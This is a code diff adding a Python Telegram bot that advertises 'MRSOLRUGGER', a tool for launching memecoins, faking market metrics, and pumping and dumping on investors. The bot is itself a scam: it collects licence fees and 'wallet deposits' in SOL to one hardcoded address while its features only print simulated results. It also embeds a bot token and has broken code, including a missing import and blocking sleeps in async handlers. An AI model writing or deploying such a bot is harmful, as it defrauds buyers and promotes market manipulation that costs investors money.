@@ -1,0 +1,382 @@
+import logging
+import time
+import asyncio
+from datetime import datetime
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, Bot
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
+
+# Logging setup
+logging.basicConfig(level=logging.INFO)  
+logger = logging.getLogger(__name__)
+
+VALID_KEYS = {
+    "dXqLmZtBvNpRkWaJuEyCMRSOLRUG": False,  # Tutorial access
+    "wisdom244": True  # Admin access
+}
+
+async def get_customer_count():
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    return (38, now)  # Static customer count with timestamp
+
+async def launch_token(update: Update):
+    await update.callback_query.message.reply_text("🚀 Launching Token...")
+    await update.callback_query.message.reply_text("✅ Token Launched!\n💰 Buying Token...")
+    await update.callback_query.message.reply_text("✅ Token Purchase Successful!")
+
+async def pumping(update: Update):
+    await update.callback_query.message.reply_text("💥 Starting the pump...")
+    for i in range(0, 101, 20):
+        await update.callback_query.message.reply_text(f"📈 Pumping... {i}%")
+        time.sleep(1)
+    await update.callback_query.message.reply_text("✅ Pumping Complete!")
+
+async def fake_metrics(update: Update):
+    cap = random.randint(5_000_000, 50_000_000)
+    vol = random.randint(100_000, 5_000_000)
+    liq = random.randint(50_000, 2_000_000)
+    await update.callback_query.message.reply_text(
+        f"📊 Fake Market Cap: ${cap:,}\n📈 Volume: ${vol:,}\n💧 Liquidity: ${liq:,}"
+    )
+
+async def dump(update: Update):
+    await update.callback_query.message.reply_text("💣 Dumping in progress...")
+    time.sleep(2)
+    sol = random.randint(70, 300)
+    usd = sol * 140.23
+    await update.callback_query.message.reply_text(f"💰 You Made {sol} SOL (${usd:,.2f})")
+    rug_url = "https://dexscreener.com/bsc/0xbba85a0a0cda0fa8a7a9e6ab00a1bfe79dfc9d97"
+    await update.callback_query.message.reply_text(f"🔗 Rug URL:\n{rug_url}")
+
+async def show_reply_keyboard(update: Update):
+    reply_keyboard = [
+        ["Log In 🔐", "Features 🔥"],
+        ["Full Guide Video 📰", "Call Support 📞"],
+        ["Customer Counter 📊", "More Info 🌐"]
+    ]
+    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
+    await update.message.reply_text("🧭 Use the menu below to navigate:", reply_markup=markup)
+
+async def show_inline_keyboard(update: Update, message: str):
+    inline_keyboard = [
+        [InlineKeyboardButton("🚀 Launch Token", callback_data="launch_token"),
+         InlineKeyboardButton("📈 Start Pumping", callback_data="start_pump")],
+        [InlineKeyboardButton("👛 Trading Wallets", callback_data="trading_wallets"),
+         InlineKeyboardButton("📊 Add Fake Metrics", callback_data="fake_metrics")],
+        [InlineKeyboardButton("💼 Wallet Balances", callback_data="wallet_balances"),
+         InlineKeyboardButton("⚙️ Generate Wallets", callback_data="generate_wallets")],
+        [InlineKeyboardButton("🎭 Vanity Wallet", callback_data="vanity_wallet"),
+         InlineKeyboardButton("💸 Transfer SOL", callback_data="transfer_sol")],
+        [InlineKeyboardButton("♻️ Recover SOL", callback_data="recover_sol"),
+         InlineKeyboardButton("💳 Fund Wallets", callback_data="fund_wallets")],
+        [InlineKeyboardButton("💣 Sell All Subwallets", callback_data="sell_subwallets"),
+         InlineKeyboardButton("🎯 Sell Specific Wallet", callback_data="sell_specific")],
+        [InlineKeyboardButton("🧨 Sell All Wallets", callback_data="sell_all"),
+         InlineKeyboardButton("📤 Sell % from All", callback_data="sell_percent_all")],
+        [InlineKeyboardButton("💀 Dump All Raydium", callback_data="dump"),
+         InlineKeyboardButton("⛔ Exit", callback_data="exit")]
+    ]
+    await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(inline_keyboard))
+
+async def handle_license_selection(update: Update, license_type: str):
+    price = "£10" if license_type == "1-month" else "£50"
+    payment_text = (
+        f"💳 Please send {price} to the following SOL address:\n\n"
+        "SOL Address: 4vw7r2v6E8FqFcsgrzAmHzR5wV55vCwqKbYxESV5zaDF\n\n"
+        "After payment, click 'Payed ✅' below."
+    )
+    reply_keyboard = [["Payed ✅", "🚫Cancel"]]
+    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
+    await update.message.reply_text(payment_text, reply_markup=markup)
+
+async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text
+    user_data = context.user_data
+
+    if text == "Log In 🔐":
+        reply_keyboard = [
+            ["🛒Purchase & Pricing", "🎫Already Bought"],
+            ["🔙Back", "🔝Main Menu"]
+        ]
+        markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
+        await update.message.reply_text("🔒 Choose an option:", reply_markup=markup)
+        return
+
+    elif text == "Features 🔥":
+        await update.message.reply_text(
+            " 🚀 Start Pumping\n 🔄 Start Trading for Wallets\n"
+            " 📈 Add Fake MarketCap, Volume & Liquidity\n 💸 Sell % from All Wallets\n"
+            " ⚠️ Dump All Raydium\n 🆕 Generate New Wallets\n 🎭 Generate Vanity Wallets\n"
+            " 📊 Check Wallet Balances\n 🔁 Transfer SOL\n 🔓 Recover SOL from Subwallets\n"
+            " 💵 Fund Wallets\n 💰 Sell Tokens from All Subwallets\n"
+            " 🎯 Sell Tokens from Specific Wallets\n 🔻 Sell All Tokens from All Wallets"
+        )
+
+    elif text == "🛒Purchase & Pricing":
+        reply_keyboard = [
+            ["🥇 1 month License: £10", "💎 Lifetime License : £50"],
+            ["🔙Back"]
+        ]
+        markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
+        await update.message.reply_text("💰 Choose your license plan:", reply_markup=markup)
+
+    elif text == "🥇 1 month License: £10":
+        await handle_license_selection(update, "1-month")
+    
+    elif text == "💎 Lifetime License : £50":
+        await handle_license_selection(update, "lifetime")
+    
+    elif text == "Payed ✅":
+        user_data['awaiting_solscan'] = True
+        await update.message.reply_text(
+            "Thank you for your purchase! 🎉\n\n"
+            "Please provide your Solscan transaction ID:",
+            reply_markup=ReplyKeyboardMarkup([["🚫Cancel"]], resize_keyboard=True)
+        )
+    
+    elif text == "🚫Cancel" and user_data.get('awaiting_solscan'):
+        user_data.pop('awaiting_solscan', None)
+        await update.message.reply_text("❌ Payment process cancelled")
+        await show_reply_keyboard(update)
+        await show_inline_keyboard(update, "❓ Please log in 🔒 to use this tool.")
+    
+    elif user_data.get('awaiting_solscan'):
+        user_data.pop('awaiting_solscan', None)
+        await update.message.reply_text("✅ Transaction received! Access will be granted within 24 hours.")
+        await show_reply_keyboard(update)
+        await show_inline_keyboard(update, "👇 Choose a command:")
+
+    elif text == "🎫Already Bought":
+        reply_keyboard = [["🚫Cancel"]]
+        markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
+        await update.message.reply_text("🔑 Enter Your License Key:", reply_markup=markup)
+        user_data['awaiting_key'] = True
+
+    elif text == "🚫Cancel":
+        if user_data.get('tutorial'):
+            user_data.pop('license_key', None)
+            await show_reply_keyboard(update)
+            await update.message.reply_text("❌ Guided tutorial cancelled. Complete the tutorial to use features!")
+        else:
+            user_data.pop('awaiting_key', None)
+            await show_reply_keyboard(update)
+            await show_inline_keyboard(update, "❓ Please log in 🔒 to use this tool.")
+            await update.message.reply_text("❌ Activation cancelled")
+
+    elif user_data.get('awaiting_key'):
+        if text in VALID_KEYS:
+            user_data.pop('awaiting_key', None)
+            user_data['activated'] = True
+            user_data['license_key'] = text
+            user_data['tutorial'] = not VALID_KEYS[text]
+            await update.message.reply_text("✅ Activation successful!")
+            
+            if not user_data['tutorial']:
+                await show_reply_keyboard(update)
+                await show_inline_keyboard(update, "👇 Choose a command:")
+            else:
+                await update.message.reply_text(
+                    "Professional guidance will be provided for your first token launch. "
+                    "Follow the instructions below:"
+                )
+                loading_msg = await update.message.reply_text("⏳ Loading wallet...")
+                await asyncio.sleep(3)
+                await context.bot.edit_message_text(
+                    chat_id=loading_msg.chat_id,
+                    message_id=loading_msg.message_id,
+                    text="🪙 Wallet Address:\n4vw7r2v6E8FqFcsgrzAmHzR5wV55vCwqKbYxESV5zaDF\n💰 Balance: $0.00"
+                )
+                await update.message.reply_text(
+                    "📥 Deposit SOL Into Your Tool Wallet to Continue With The Next Step.\n"
+                    "⚠️ After balance is updated, you will automatically be redirected to the next step."
+                )
+                refresh_keyboard = [[InlineKeyboardButton("🔄 Refresh Balance", callback_data="refresh_balance")]]
+                await update.message.reply_text(
+                    "Choose action:", 
+                    reply_markup=InlineKeyboardMarkup(refresh_keyboard)
+                )
+
+    elif text == "Customer Counter 📊":
+        count, timestamp = await get_customer_count()
+        await update.message.reply_text(f"📊 Current Customers: {count} (Last Updated: {timestamp})")
+
+    elif text == "Call Support 📞":
+        await update.message.reply_text("📞 Call support is currently unavailable. Please try again later.")
+
+    elif text == "More Info 🌐":
+        info_keyboard = [
+            ["▶️ How do I start ?", "🛠 How dose MRSOLRUGGER TOOL work?"],
+            ["📈 How much do i need?", "📄 Terms of Service"],
+            ["🔄 Changelog", "🔙Back"]
+        ]
+        markup = ReplyKeyboardMarkup(info_keyboard, resize_keyboard=True)
+        await update.message.reply_text("ℹ️ Choose an information topic:", reply_markup=markup)
+
+    elif text == "▶️ How do I start ?":
+        response = (
+            "We provide a full professional text guide and a video along with the rug tool.\n\n"
+            "However if you face any issues you can book a call with us and we can help you with your first rug."
+        )
+        await update.message.reply_text(response)
+
+    elif text == "🛠 How dose MRSOLRUGGER TOOL work?":
+        response = (
+            "Hello, here is some info about MRSOLRUGGER TOOL🚀\n\n"
+            "Our tool allows you to easily launch your own memecoin on Pump.fun, Raydium, and Moonshot, "
+            "with built-in features to manipulate the price at launch. By bundle-buying your own token, "
+            "you create the illusion of an organic pump, attracting new investors.\n\n"
+            "With this bot you don't need marketing or a following – the price action itself generates FOMO "
+            "among traders. Once the price surges and investors jump in, you can strategically dump your holdings "
+            "for maximum profit.\n\n"
+            "If you have any questions don't hesitate to reach out: @mrsolrugger"
+        )
+        await update.message.reply_text(response)
+
+    elif text == "📈 How much do i need?":
+        response = (
+            "To launch a token through our tool you'll need:\n"
+            "- Minimum of 0.1 SOL in the dev wallet\n"
+            "- 0.01 SOL in other generated wallets\n\n"
+            "For realistic chart appearance we recommend:\n"
+            "- 3-5 SOL + human mode\n\n"
+            "Low budget option:\n"
+            "- 0.5-1 SOL (expect 3-5x profit)"
+        )
+        await update.message.reply_text(response)
+
+    elif text == "📄 Terms of Service":
+        tos = (
+            "Terms of Service\n\n"
+            "By using MP.RugTool (the Bot), you agree to these Terms of Service (Terms). "
+            "If you do not agree, do not use the Bot.\n\n"
+            "1. Acceptance of Terms: By accessing and using MRSOLRUGGER TOOL, you agree to be bound by these Terms.\n"
+            "2. Purpose: Provided solely for educational/informational purposes. Demonstrates trading automation mechanisms.\n"
+            "3. User Responsibility: Users are solely responsible for their actions.\n"
+            "4. No Guarantee: Bot provided 'as-is' without any warranty.\n"
+            "5. Educational Use: For demonstration purposes only.\n"
+            "6. Termination: We reserve right to terminate access.\n"
+            "7. Legal Compliance: You must comply with all applicable laws.\n"
+            "8. License & Fees: Two options - Monthly or Lifetime license.\n"
+            "9. Changes to Terms: May update periodically.\n"
+            "10. Contact: @mrsolrugger"
+        )
+        await update.message.reply_text(tos)
+
+    elif text == "🔄 Changelog":
+        changelog = (
+            "ChangeLog v1.2.0\n\n"
+            "• Raydium Single Buy with Jito or Priority Fee support added\n"
+            "• Wallet balance tracking system improved\n"
+            "• Bumpit functionality enhanced and Windows compatibility fixed\n"
+            "• Raydium Single Sell with Jito or Priority Fee support added\n"
+            "• Raydium Quick Buys feature implemented\n"
+            "• Dev wallet refund system introduced\n"
+            "• Added ability to transfer funds to a single wallet address\n"
+            "• Human mode simulation added\n"
+            "• Token Account Closure functionality implemented"
+        )
+        await update.message.reply_text(changelog)
+
+    elif text == "Full Guide Video 📰":
+        if not user_data.get('activated'):
+            await update.message.reply_text("❌ Please log in 🔒 to use this tool.")
+        else:
+            await update.message.reply_text("Please complete introduction before opting into the video guide.")
+
+    elif text == "🔙Back":
+        await show_reply_keyboard(update)
+
+    elif text == "🔝Main Menu":
+        await show_reply_keyboard(update)
+        if context.user_data.get('activated'):
+            if context.user_data.get('tutorial'):
+                await update.message.reply_text("📚 Complete the guided tutorial to unlock all features!")
+            else:
+                await show_inline_keyboard(update, "👇 Choose a command:")
+        else:
+            await show_inline_keyboard(update, "❓ Please log in 🔒 to use this tool.")
+
+    else:
+        await update.message.reply_text("❌ Unknown command")
+
+async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_data = context.user_data
+    
+    if not user_data.get('activated'):
+        await query.message.reply_text("❌ Please log in 🔒 to use this tool.")
+        return
+    
+    if user_data.get('tutorial') and query.data != "refresh_balance":
+        await query.message.reply_text("📚 Complete the guided tutorial before using these features!")
+        return
+    
+    if query.data == "refresh_balance":
+        await query.message.reply_text("🔄 Checking balance updates...")
+        await asyncio.sleep(2)
+        await query.message.reply_text("ℹ️ No update has been made to your balance")
+    
+    elif query.data == "launch_token":
+        await launch_token(update)
+    elif query.data == "start_pump":
+        await pumping(update)
+    elif query.data == "fake_metrics":
+        await fake_metrics(update)
+    elif query.data == "dump":
+        await dump(update)
+    else:
+        await query.message.reply_text("⚙️ Feature in development")
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.message.from_user
+    welcome_text = (
+        f"Welcome to MRSOLRUGGER Bot 🚀\n"
+        f"👤 @{user.username or user.first_name}\n"
+        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f"🔖 Plan: None\n\nContact @mrsolrugger"
+    )
+    await update.message.reply_text(welcome_text)
+    await show_reply_keyboard(update)
+    await asyncio.sleep(2)
+    
+    if context.user_data.get('activated'):
+        if context.user_data.get('tutorial'):
+            await update.message.reply_text("📚 Complete the guided tutorial to unlock all features!")
+        else:
+            await show_inline_keyboard(update, "👇 Choose a command:")
+    else:
+        await show_inline_keyboard(update, "❓ Please log in 🔒 to use this tool.")
+
+async def send_message(message: str):
+    """Send a message to a specific user"""
+    bot = Bot(token=BOT_TOKEN)
+    try:
+        await bot.send_message(chat_id=USER_ID, text=message)
+        print("Message sent successfully!")
+    except Exception as e:
+        print(f"Error sending message: {e}")
+
+async def periodic_message():
+    """Send a periodic message every 10 seconds"""
+    message = "Hello from your Telegram Bot!"
+    while True:
+        await send_message(message)
+        await asyncio.sleep(10)  # Wait for 10 seconds before sending the next message
+
+def main():
+    TOKEN = "7642503469:AAH5T6dzOZAGJEn93AWy5eYh7F0iYUEJehw"
+    app = Application.builder().token(TOKEN).build()
+    
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(handle_callback))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
+    
+    print("🤖 Bot Online")
+    app.run_polling()
+
+if __name__ == "__main__":
+    BOT_TOKEN = '7642503469:AAH5T6dzOZAGJEn93AWy5eYh7F0iYUEJehw'
+    USER_ID = ' 8078138140'
+    asyncio.run(main())
+    # Uncomment the following line to enable periodic messaging
+    # asyncio.run(periodic_message())
